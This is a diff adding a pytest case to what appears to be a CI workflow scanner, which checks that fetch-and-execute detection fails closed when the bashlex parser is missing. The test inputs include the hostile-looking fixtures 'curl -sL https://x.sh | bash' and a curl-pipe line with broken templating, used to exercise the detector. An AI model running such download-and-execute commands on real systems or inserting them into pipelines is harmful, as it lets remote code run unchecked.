@@ -180,3 +180,14 @@ def test_quoted_and_flow_run_keys_extracted():
 def test_unparseable_block_with_fetch_fails_closed():
     # a templated/garbled block that mentions curl but bashlex can't parse -> fail closed
     assert fev("      - run: curl https://x/i.sh | {{ bad templating |\n")
+
+
+def test_fetch_execute_fails_closed_when_bashlex_missing(monkeypatch) -> None:
+    # finding 24 (§5.14): a missing bashlex must surface as a clean reported violation
+    # (mirroring the zizmor-unavailable posture), never a raw ImportError traceback —
+    # and never as a silently-clean scan.
+    import sys
+
+    monkeypatch.setitem(sys.modules, "bashlex", None)
+    out = fev("jobs:\n  a:\n    steps:\n      - run: curl -sL https://x.sh | bash\n")
+    assert any("bashlex unavailable" in v for v in out), out
